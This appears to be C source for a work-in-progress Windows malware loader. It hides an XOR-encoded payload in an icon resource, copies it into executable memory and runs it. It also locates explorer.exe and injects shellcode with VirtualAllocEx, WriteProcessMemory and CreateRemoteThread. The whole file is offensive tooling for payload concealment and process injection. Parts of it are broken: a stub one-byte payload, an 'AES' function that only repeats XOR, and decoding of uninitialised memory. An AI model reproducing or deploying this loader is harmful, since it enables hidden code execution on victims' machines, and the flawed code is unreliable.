#include <windows.h>
#include "resources.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// Might need this library to decrypt
// #include "openSSL/aes.h"

char key[] = "mysecretpassword";
// These are only here to compile, will need to move the payload into falcon.ico
// file.
unsigned char payload[] = {0xfc};
unsigned int payload_len = 334;
// decocde XOR
void XOR(char* data, size_t data_len, char* key, size_t key_len)
{
    int j = 0;
    for (int i = 0; i < data_len; i++)
    {
        if (j == key_len - 1)
            j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}
// decode AES
void AES(char* data, size_t data_len, char* key, size_t key_len)
{
    int j = 0;
    for (int i = 0; i < data_len; i++)
    {
        if (j == key_len - 1)
            j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len)
{

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode =
        VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len,
                       (SIZE_T*)NULL);

    hThread = CreateRemoteThread(
        hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}
int FindTarget(const char* procname)
{

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32))
    {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32))
    {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0)
        {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}
void code_injection()
{
    HANDLE hProc = NULL;
    int pid = 0;
    pid = FindTarget("explorer.exe");
    if (pid)
    {
        printf("PID FOUND AT ==> %d\n", pid);

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                PROCESS_VM_OPERATION | PROCESS_VM_READ |
                                PROCESS_VM_WRITE,
                            FALSE, (DWORD)pid);
        if (hProc != NULL)
        {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
}
int main(void)
{
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;

    unsigned char* payload;
    unsigned int payload_len;

    XOR((char*)exec_mem, payload_len, key, sizeof(key));
    // Extract payload from resources section
    HRSRC res;
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    // payload = (char*)LockResource(resHandle);
    // payload_len = SizeofResource(NULL, res);

    // Allocate some memory buffer for payload
    exec_mem =
        VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

    // Copy payload to new memory buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me!\n");
    getchar();

    // Launch the payload
    if (rv != 0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
